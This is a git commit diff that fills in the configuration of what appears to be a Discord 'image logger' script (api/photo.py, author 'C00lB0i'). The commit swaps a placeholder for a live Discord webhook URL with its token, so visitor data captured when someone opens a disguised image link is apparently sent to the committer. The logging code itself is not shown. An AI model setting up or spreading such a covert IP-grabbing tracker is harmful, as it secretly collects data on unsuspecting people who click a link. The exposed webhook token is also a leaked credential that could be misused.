fc759159e0a8bd9017f7f468cc29d88eceb43143
Xval4k <vaseanuhuh20101@gmail.com>
2025-12-31 02:28:46 +0200

    Update photo.py

--- api/photo.py
+++ api/photo.py
@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "Your webhook here",
+    "webhook": "https://discord.com/api/webhooks/1455719071902335060/yQEyerDv_2HYT-HbAwEB_wt-KVuRRs4MLk6QoGHwSxhwqPKySGTXORXfcpuays6OOXMC",
     "image": "https://tenor.com/view/dexter-james-doakes-surprise-mf-can%27t-prove-it-gif-7408854170742055240", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
